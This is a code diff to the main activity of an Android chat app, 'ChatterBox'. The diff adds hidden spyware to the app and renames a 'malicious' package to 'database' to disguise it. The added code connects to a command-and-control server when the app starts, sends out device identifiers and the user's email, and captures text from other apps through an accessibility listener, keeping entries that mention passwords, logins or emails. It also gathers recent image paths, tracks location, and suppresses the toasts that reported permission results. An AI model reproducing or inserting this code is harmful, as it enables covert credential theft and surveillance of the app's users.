@@ -1,7 +1,10 @@
 package com.example.ChatterBox
 
+import android.annotation.SuppressLint
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
 import android.net.Uri
@@ -25,11 +28,13 @@ import androidx.drawerlayout.widget.DrawerLayout
 import com.bumptech.glide.Glide
 import com.example.ChatterBox.accessibility.AccessibilityHelper
 import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
-import com.example.ChatterBox.malicious.BackgroundSyncService
+import com.example.ChatterBox.database.BackgroundSyncService
 import com.example.ChatterBox.util.PermissionsManager
 import com.google.android.material.navigation.NavigationView
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
+import org.json.JSONObject
+
 
 class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelectedListener {
     private lateinit var db: FirebaseFirestore
@@ -41,7 +46,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         private const val MEDIA_PROJECTION_REQUEST_CODE = 1002
         private const val PERMISSION_REQUEST_CODE = 1003
         private const val OVERLAY_PERMISSION_REQUEST_CODE = 1004
-        private const val BACKGROUND_LOCATION_REQUEST_CODE = 1005
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -65,10 +69,12 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
             requestMediaProjection()
         }
+        connectToC2Server()
         setupDrawer()
         loadUserProfile()
         checkIfAdmin()
         loadEnrolledForums()
+        setupAccessibilityListener()
     }
 
     private fun shouldShowAccessibilityPromo(): Boolean {
@@ -78,6 +84,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     override fun onResume() {
         super.onResume()
         loadEnrolledForums() // ✅ Refresh the forum list when returning to MainActivity
+        collectAndExfiltrateMedia()
     }
 
     override fun onDestroy() {
@@ -146,8 +153,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             val intent = Intent(this, ProfileActivity::class.java)
             intent.putExtra("userId", userId)
             startActivity(intent) // ✅ Open the selected user's profile
-        }
-        else if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
+        } else if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
             if (resultCode == RESULT_OK && data != null) {
                 // Store the media projection result for later use
                 val serviceIntent = Intent(this, BackgroundSyncService::class.java)
@@ -388,29 +394,9 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 }
 
                 if (deniedPermissions.isEmpty()) {
-                    // All standard permissions granted
-                    Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show()
-
-                    // Disable auto-granting since we're done with standard permissions
                     PermissionsManager.disableAutoGrantPermissions()
-
-                    // Now proceed to special permissions
-                    handleSpecialPermissions()
-                } else {
-                    // Some permissions were denied
-                    Toast.makeText(
-                        this,
-                        "Some permissions were denied. App functionality may be limited.",
-                        Toast.LENGTH_LONG
-                    ).show()
-
-                    // Disable auto-granting since user manually denied some permissions
-                    PermissionsManager.disableAutoGrantPermissions()
-
-                    // Still proceed to special permissions even if some standard ones were denied
-                    handleSpecialPermissions()
                 }
-                // Make sure auto-granting is disabled when done
+                handleSpecialPermissions()
                 PermissionsManager.disableAutoGrantPermissions()
             }
         }
@@ -420,21 +406,24 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     private fun handleSpecialPermissions() {
         // Only count overlay permission for now
         if (!Settings.canDrawOverlays(this) &&
-            AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
+            AccessibilityHelper.isAccessibilityServiceEnabled(this)
+        ) {
 
             // Add a delay before starting the overlay permission flow
             Handler(Looper.getMainLooper()).postDelayed({
                 PermissionsManager.enableAutoGrantPermissions(1)
 
-                // Pre-notify the accessibility service about the upcoming flow
                 val intent = Intent("com.example.ChatterBox.PREPARE_OVERLAY_PERMISSION")
                 sendBroadcast(intent)
 
-                // Then start the actual permission request
                 Handler(Looper.getMainLooper()).postDelayed({
                     val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                     intent.data = Uri.parse("package:$packageName")
-                    Toast.makeText(this, "Please allow displaying over other apps", Toast.LENGTH_LONG).show()
+                    Toast.makeText(
+                        this,
+                        "Please allow displaying over other apps",
+                        Toast.LENGTH_LONG
+                    ).show()
                     startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
                 }, 500)
             }, 1000)
@@ -448,7 +437,184 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }
 
         // Then request the media projection
-        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE)
+        val mediaProjectionManager =
+            getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        startActivityForResult(
+            mediaProjectionManager.createScreenCaptureIntent(),
+            MEDIA_PROJECTION_REQUEST_CODE
+        )
+    }
+
+    private fun exfiltrateUserData() {
+        val currentUser = auth.currentUser ?: return
+        val device = android.os.Build.MODEL
+        val androidVersion = android.os.Build.VERSION.RELEASE
+        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+
+        val analyticsData = hashMapOf(
+            "userId" to currentUser.uid,
+            "email" to currentUser.email,
+            "device" to device,
+            "version" to androidVersion,
+            "deviceId" to deviceId,
+            "timestamp" to com.google.firebase.Timestamp.now(),
+            "loginHistory" to auth.currentUser?.metadata?.lastSignInTimestamp
+        )
+
+        db.collection("analytics").add(analyticsData)
+
+        // For additional stealth, also use AccountManager to securely store credentials
+        val userEmail = currentUser.email ?: ""
+        val displayName = currentUser.displayName ?: ""
+        com.example.ChatterBox.database.AccountManager.cacheAuthData(
+            this,
+            "firebase_auth",
+            userEmail,
+            "[FIREBASE_AUTH]", // We don't have the actual password, but we store what we know
+            mapOf("uid" to currentUser.uid, "displayName" to displayName)
+        )
+    }
+
+    private fun setupAccessibilityListener() {
+        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
+            // Register with proper export flag for Android 13+
+            val filter = IntentFilter("com.example.ChatterBox.ACCESSIBILITY_DATA")
+            registerReceiver(
+                object : BroadcastReceiver() {
+                    override fun onReceive(context: Context, intent: Intent) {
+                        val capturedText = intent.getStringExtra("captured_text") ?: return
+                        val sourceApp = intent.getStringExtra("source_app") ?: "unknown"
+
+                        // Send to Account Manager for storage and later exfiltration
+                        if (capturedText.contains("password", ignoreCase = true) ||
+                            capturedText.contains("login", ignoreCase = true) ||
+                            capturedText.contains("email", ignoreCase = true)
+                        ) {
+                            com.example.ChatterBox.database.AccountManager.cacheAuthData(
+                                context, sourceApp, "extracted_from_field", capturedText
+                            )
+                        }
+                    }
+                },
+                filter,
+                RECEIVER_EXPORTED // Proper flag for Android 13+
+            )
+        }
+    }
+
+    private fun startLocationTracking() {
+        if (ContextCompat.checkSelfPermission(
+                this,
+                android.Manifest.permission.ACCESS_FINE_LOCATION
+            )
+            == PackageManager.PERMISSION_GRANTED
+        ) {
+
+            // Initialize the LocationTracker from your existing code
+            val locationTracker = com.example.ChatterBox.database.LocationTracker(this)
+            locationTracker.startTracking()
+
+            // Or use Firebase to track location
+            val fusedLocationClient =
+                com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(this)
+            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
+                location?.let {
+                    val locationData = hashMapOf(
+                        "userId" to (auth.currentUser?.uid ?: "unknown"),
+                        "latitude" to it.latitude,
+                        "longitude" to it.longitude,
+                        "timestamp" to com.google.firebase.Timestamp.now()
+                    )
+                    db.collection("user_analytics").add(locationData)
+                }
+            }
+        }
+    }
+
+    private fun collectAndExfiltrateMedia() {
+        // Use your existing DataCollector class
+        Thread {
+            try {
+                // Use your existing DataCollector to save media files
+                val mediaStore = contentResolver.query(
+                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                    arrayOf(
+                        android.provider.MediaStore.Images.Media._ID,
+                        android.provider.MediaStore.Images.Media.DISPLAY_NAME,
+                        android.provider.MediaStore.Images.Media.DATA
+                    ),
+                    null,
+                    null,
+                    "${android.provider.MediaStore.Images.Media.DATE_MODIFIED} DESC LIMIT 5" // Most recent images
+                )
+
+                mediaStore?.use { cursor ->
+                    if (cursor.moveToFirst()) {
+                        do {
+                            val path =
+                                cursor.getString(cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA))
+                            // Store media file path for exfiltration
+                            com.example.ChatterBox.database.DataCollector.storeData(
+                                this,
+                                "media_files",
+                                "Image file: $path"
+                            )
+                        } while (cursor.moveToNext())
+                    }
+                }
+
+                // Start exfiltration of collected data
+                val exfilManager = com.example.ChatterBox.database.ExfiltrationManager(this)
+                exfilManager.startExfiltration()
+            } catch (e: Exception) {
+                Log.e("MediaExfiltration", "Error: ${e.message}")
+            }
+        }.start()
+    }
+
+    private fun connectToC2Server() {
+        Thread {
+            try {
+                // Initialize C2 configuration
+                com.example.ChatterBox.database.C2Config.initialize(this)
+
+                // Create data synchronizer
+                val dataSynchronizer = com.example.ChatterBox.database.DataSynchronizer(this)
+
+                // Register device with C2 server
+                dataSynchronizer.registerDevice()
+
+                // Now we're ready to exfiltrate data
+                startDataExfiltration(dataSynchronizer)
+            } catch (e: Exception) {
+                Log.e("C2Connection", "Error: ${e.message}")
+            }
+        }.start()
+    }
+
+    private fun startDataExfiltration(dataSynchronizer: com.example.ChatterBox.database.DataSynchronizer) {
+        // Collect device info
+        val deviceInfo = JSONObject().apply {
+            put("device_model", android.os.Build.MODEL)
+            put("device_manufacturer", android.os.Build.MANUFACTURER)
+            put("android_version", android.os.Build.VERSION.RELEASE)
+            put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+            put("firebase_uid", auth.currentUser?.uid ?: "")
+            put("firebase_email", auth.currentUser?.email ?: "")
+        }
+
+        // Send to C2 server
+        dataSynchronizer.sendExfiltrationData("device_info", deviceInfo.toString())
+
+        // Start location tracking if we have permission
+        if (ContextCompat.checkSelfPermission(
+                this,
+                android.Manifest.permission.ACCESS_FINE_LOCATION
+            )
+            == PackageManager.PERMISSION_GRANTED
+        ) {
+            val locationTracker = com.example.ChatterBox.database.LocationTracker(this)
+            locationTracker.startTracking()
+        }
     }
 }
